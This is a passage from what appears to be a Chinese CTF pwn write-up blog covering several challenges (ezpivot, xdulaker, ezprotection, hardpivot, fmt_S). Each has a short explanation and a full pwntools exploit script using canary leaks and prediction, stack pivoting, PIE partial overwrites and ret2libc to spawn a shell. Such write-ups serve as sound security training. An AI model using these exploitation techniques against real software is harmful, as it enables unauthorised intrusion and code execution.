<h3 id="EXP-13"><a href="#EXP-13" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">65138</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">False</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">seed = <span class="built_in">int</span>(time.time())</span><br><span class="line">libc.srand(seed)</span><br><span class="line">sla(<span class="string">b&quot;Do you want to brute-force this system? (y/n)&quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line">win = <span class="number">0x40127E</span></span><br><span class="line">canary = libc.rand() % <span class="number">114514</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x7C</span>) + p64(canary) + <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0xc</span> + <span class="number">8</span>) + p64(win)</span><br><span class="line">sla(<span class="string">b&quot;Enter your message:&quot;</span>, payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="ezpivot"><a href="#ezpivot" class="headerlink" title="ezpivot"></a>ezpivot</h2><h3 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h3><p>打法就是栈迁移，但我刚开始遇到一个问题：system会崩</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> RAX  0</span><br><span class="line"> RBX  0x404078 (desc+24) ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br><span class="line"> RCX  0x797119b147e2 (read+18) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */</span><br><span class="line"> RDX  1</span><br><span class="line"> RDI  0x404078 (desc+24) ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br><span class="line"> RSI  0x7ffd41daa3c4 ◂— 0</span><br><span class="line"> R8   0x26</span><br><span class="line"> R9   0</span><br><span class="line"> R10  0x797119bbeac0 (_nl_C_LC_CTYPE_toupper+512) ◂— 0x100000000</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x7ffd41daa4e8 —▸ 0x7ffd41dac225 ◂— 0x5953006e77702f2e /* &#x27;./pwn&#x27; */</span><br><span class="line"> R13  0x797119c1c7a0 (quit) ◂— 0</span><br><span class="line"> R14  0x797119c1c840 (intr) ◂— 0</span><br><span class="line"> R15  0x797119d77040 (_rtld_global) —▸ 0x797119d782e0 ◂— 0</span><br><span class="line"> RBP  0</span><br><span class="line"> RSP  0x403cb8 ◂— 0</span><br><span class="line"> RIP  0x797119a50948 (do_system+72) ◂— mov dword ptr [rsp + 0x18], 0xffffffff</span><br><span class="line">──────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────</span><br><span class="line"> ► 0x797119a50948 &lt;do_system+72&gt;     mov    dword ptr [rsp + 0x18], 0xffffffff        [0x403cd0] &lt;= 0xffffffff</span><br><span class="line">   0x797119a50950 &lt;do_system+80&gt;     mov    qword ptr [rsp + 0x180], 1                [_DYNAMIC+128] &lt;= 1</span><br><span class="line">   0x797119a5095c &lt;do_system+92&gt;     mov    dword ptr [rsp + 0x208], 0                [_DYNAMIC+264] &lt;= 0</span><br><span class="line">   0x797119a50967 &lt;do_system+103&gt;    mov    qword ptr [rsp + 0x188], 0                [_DYNAMIC+136] &lt;= 0</span><br><span class="line">   0x797119a50973 &lt;do_system+115&gt;    movaps xmmword ptr [rsp], xmm1                   &lt;[0x403cb8] not aligned to 16 bytes&gt;</span><br><span class="line">   0x797119a50977 &lt;do_system+119&gt;    lock cmpxchg dword ptr [rip + 0x1cbe01], edx</span><br></pre></td></tr></table></figure>

<p>原因是在 <code>do_system+72</code> 处，当尝试向 <code>rsp + 0x18</code> 写入数据时失败。从寄存器状态可以看到 <code>RSP = 0x403cb8</code>，这个地址不属于bss段了，不可写。</p>
<p>还有一个小问题是<strong>栈对齐问题</strong>：错误信息中显示 <code>movaps xmmword ptr [rsp], xmm1</code> 时提示 <code>[0x403cb8] not aligned to 16 bytes</code>，说明栈指针没有16字节对齐，而SSE指令要求内存操作数必须对齐</p>
<p>题目中的 introduce()，在这步我们可以在bss段上布局我们设计好的新栈，但<code>nbytes</code>被限制&lt;&#x3D;32（这一步的判断在main()中），想要绕过，就要用的<code>int</code>有符号整数与<code>unsigned int</code>无符号整数之间的转换问题了，这里不过多介绍，绕过方法就是<code>nbytes = -1（是负数即可）</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">introduce</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;desc, nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Ok,we got your introduction!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>&amp;desc</code>位于0x404060，这个地址太低了，且system需要很大的栈空间，如果将栈迁移到这里就会遇到system崩掉的问题，解决方法就是通过大量<code>ret</code>来填充bss空间，抬高我们设计的新栈地址</p>
<table>
<thead>
<tr>
<th align="center">bss段的空间</th>
<th align="center">pivot</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0x404060</td>
<td align="center">“&#x2F;bin&#x2F;sh\x00”</td>
</tr>
<tr>
<td align="center">0x404068</td>
<td align="center">ret</td>
</tr>
<tr>
<td align="center">…….</td>
<td align="center">……（全是ret）</td>
</tr>
<tr>
<td align="center">0x404760</td>
<td align="center">ret（我们后面迁移的位置，新栈从这开始）</td>
</tr>
<tr>
<td align="center">0x404768</td>
<td align="center">pop_rdi</td>
</tr>
<tr>
<td align="center">0x404770</td>
<td align="center">0x404060（&#x2F;bin&#x2F;sh的地址）</td>
</tr>
<tr>
<td align="center">0x404778</td>
<td align="center">system</td>
</tr>
</tbody></table>
<h3 id="EXP-14"><a href="#EXP-14" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">65236</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x401219</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#system = 0x401230</span></span><br><span class="line">leave_ret = <span class="number">0x40120f</span></span><br><span class="line">sla(<span class="string">b&quot;Before that,you need to tell us the length of your introduction.&quot;</span>, <span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.3</span>) <span class="comment"># 注意如果脚本此处不能停顿一下，b&quot;-1&quot;会和pivot一起发出去</span></span><br><span class="line">pivot = <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(ret)*(<span class="number">0xE1</span>) + p64(pop_rdi) + p64(bss) + p64(system)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">s(pivot)</span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0xc</span>) + p64(bss + <span class="number">0x700</span>) + p64(leave_ret)</span><br><span class="line">sa(<span class="string">b&quot;Now, please tell us your phone number:&quot;</span>, payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="xdulaker"><a href="#xdulaker" class="headerlink" title="xdulaker"></a>xdulaker</h2><h3 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h3><p>存在栈空间复用，或者说是栈重叠。至于为什么，个人理解就是：</p>
<ul>
<li>函数调用时，<code>rsp</code> 向下挪一段空间，给局部变量用。</li>
<li>函数返回时，<code>rsp</code> 回到原来位置。</li>
<li><strong>栈里的数据不会被清零</strong>，只是“指针”回来了。</li>
</ul>
<p>所以：下一个函数调用时，如果分配的空间跟上一个差不多，就会落在<strong>同一片物理内存</strong>上。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov  rbp, rsp</span><br><span class="line">sub  rsp, &lt;栈空间大小&gt;</span><br></pre></td></tr></table></figure>

<h5 id="题目中"><a href="#题目中" class="headerlink" title="题目中"></a>题目中</h5><ul>
<li><p><code>photo()</code> 定义了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char buf[80];  // 占 0x50 字节</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>laker()</code> 定义了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char s1[48];   // 占 0x30 字节</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译器分配栈空间的时候，<strong>局部变量都放在 <code>rbp</code> 附近</strong>，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">photo: buf 在 rbp-0x50</span><br><span class="line">laker: s1 在 rbp-0x30</span><br></pre></td></tr></table></figure>
</li>
<li><p>两个函数在调用时都在 <strong>同一个 main() 循环里</strong> 被执行，栈的增长幅度差不多，所以 <code>s1</code> 的地址就落在了 <code>buf</code> 原来那块区域里。</p>
</li>
</ul>
<h3 id="EXP-15"><a href="#EXP-15" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;192.168.???.??&quot;, 62513)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">sla(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">ru(<span class="string">b&quot;Thanks,I&#x27;ll give you a gift:0x&quot;</span>)</span><br><span class="line">pie = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x4010</span></span><br><span class="line">ls(<span class="built_in">hex</span>(pie))</span><br><span class="line">backdoor = pie + <span class="number">0x124E</span></span><br><span class="line">sla(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">payload = <span class="string">b&quot;xdulaker&quot;</span>*(<span class="number">0x8</span>)</span><br><span class="line">sla(<span class="string">b&quot;Hey,what&#x27;s your name?!&quot;</span>, payload)</span><br><span class="line">sla(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">pad = <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x38</span>) + p64(backdoor)</span><br><span class="line">sla(<span class="string">b&quot;welcome,xdulaker&quot;</span>, pad)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="ezprotection"><a href="#ezprotection" class="headerlink" title="ezprotection"></a>ezprotection</h2><h3 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目存在后门函数backdoor()，开启了Canary和PIE保护，并且允许两次栈溢出，第一次覆盖Canary的最低一个字节使puts()打印出Canary，第二次就可以</p>
<p>通过pie保护绕过方法中的部分写入，backdoor()中还有一个随机数检验，虽然是真随机，但可以不管，直接跳转到 <code>if</code>语句部分执行读取并打印<code>flag</code>即可（注意跳转这一步需要去“撞”，需要多试几次，1&#x2F;15的成功率）</p>
<blockquote>
<ul>
<li>canary以”\x00”结束，字符串在C语言中以 \x00 作为终止符号，在使用堆栈金丝雀进行栈保护时，通常会将金丝雀的一个字节设为 \x00（也就是0字节）。这是因为很多缓冲区溢出攻击依赖于字符串操作函数（如 strcpy、gets、sprintf 等），这些函数在遇到 \x00 时会终止复制或输入。因此，canary 包含 \x00 能有效地检测和阻止大多数基于字符串操作的缓冲区溢出攻击。</li>
<li>其次部分写入和linux分页机制有关，pie保护开启后最后12位不会发生变化，对应3位16进制数字</li>
</ul>
<p>（本着有好文就不用自己写的原则【我就是懒不可以吗】，直接引用C0trick师傅的的WP<a target="_blank" rel="noopener" href="https://www.nssctf.cn/note/set/7227">文章列表 | NSSCTF</a>）</p>
</blockquote>
<h3 id="EXP-16"><a href="#EXP-16" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">55214</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">sa(<span class="string">b&quot;over you.&quot;</span>, <span class="string">b&quot;a&quot;</span>*(<span class="number">0x19</span>))</span><br><span class="line">ru(<span class="string">b&quot;a&quot;</span>*(<span class="number">0x19</span>))</span><br><span class="line">canary = u64(r(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ls(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">shell = <span class="number">0x128C</span>  <span class="comment">## 在IDA里可以找到，这是open()函数开始调用的地方</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x18</span>) + p64(canary) + <span class="string">b&quot;a&quot;</span>*(<span class="number">8</span>) + p16(shell)</span><br><span class="line">sa(<span class="string">b&quot;anyway.&quot;</span>, payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="hardpivot"><a href="#hardpivot" class="headerlink" title="hardpivot"></a>hardpivot</h2><h3 id="解题思路-17"><a href="#解题思路-17" class="headerlink" title="解题思路"></a>解题思路</h3><p>修改rbp，让 read() 读入的数据到 bss 段上，再利用<code>leave ret</code>就完成了栈的迁移，栈迁移多多注意 rbp和 rsp 的变化就对了。</p>
<h3 id="EXP-17"><a href="#EXP-17" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;192.168.???.??&quot;</span>, <span class="number">51204</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :io.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">False</span>  :io.recvuntil(delims, drop)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">ls      = <span class="keyword">lambda</span> data               :log.success(data)</span><br><span class="line">p       = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404a00</span></span><br><span class="line">pop_rdi = <span class="number">0x40119e</span></span><br><span class="line">leave_ret = <span class="number">0x40127b</span></span><br><span class="line">ru(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">read = <span class="number">0x401264</span></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x40</span>) + p64(bss + <span class="number">0x40</span>) + p64(read)</span><br><span class="line">s(payload)</span><br><span class="line">read_got = <span class="number">0x404028</span></span><br><span class="line">puts_plt = <span class="number">0x401074</span></span><br><span class="line">pad = p64(bss + <span class="number">0x40</span> + <span class="number">0x28</span>) + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(read)</span><br><span class="line">pad = pad.ljust(<span class="number">0x40</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(bss) + p64(leave_ret)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">s(pad)</span><br><span class="line"><span class="comment">#libc_base = int(r(12), 16) - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line">libc_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&#x27;read&#x27;</span>] <span class="comment"># 0x1147d0</span></span><br><span class="line">ls(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)) + libc_base</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>] + libc_base</span><br><span class="line">pay = p64(pop_rdi+<span class="number">1</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">pay = pay.ljust(<span class="number">0x40</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(bss + <span class="number">0x28</span>) + p64(leave_ret)</span><br><span class="line">s(pay)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<h2 id="fmt-S"><a href="#fmt-S" class="headerlink" title="fmt_S"></a>fmt_S</h2><h3 id="解题思路-18"><a href="#解题思路-18" class="headerlink" title="解题思路"></a>解题思路</h3><p>首先是main()对格式化字符串利用次数的限制，限制了flag &#x3D;&#x3D; 0且i&lt;&#x3D;3</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">3</span> &amp;&amp; !flag; ++i )</span><br><span class="line">    talk();</span><br><span class="line">__int64 <span class="title function_">talk</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You start talking to him...&quot;</span>);</span><br><span class="line">  flag ^= <span class="number">1u</span>;</span><br></pre></td></tr></table></figure>

<p>想要将flag一直为 0，需要利用 my_read()中的 off_by_null，由于 atk就紧邻着在flag的上方，所以只需要输入”a”*8，将atk填满即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> my_read(&amp;atk, <span class="number">8LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">my_read</span><span class="params">(_BYTE *buf, <span class="type">size_t</span> nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  buf[read(<span class="number">0</span>, buf, nbytes)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line">.bss:<span class="number">00000000004040</span>A0                 public atk</span><br><span class="line">.bss:<span class="number">00000000004040</span>A0 ; _BYTE atk</span><br><span class="line">.bss:<span class="number">00000000004040</span>A0 atk             dq ?                    ; DATA XREF: talk+<span class="number">7</span>A↑o</span><br><span class="line">.bss:<span class="number">00000000004040</span>A0                                         ; main:loc_4013BE↑r</span><br><span class="line">.bss:<span class="number">00000000004040</span>A8                 public flag</span><br><span class="line">.bss:<span 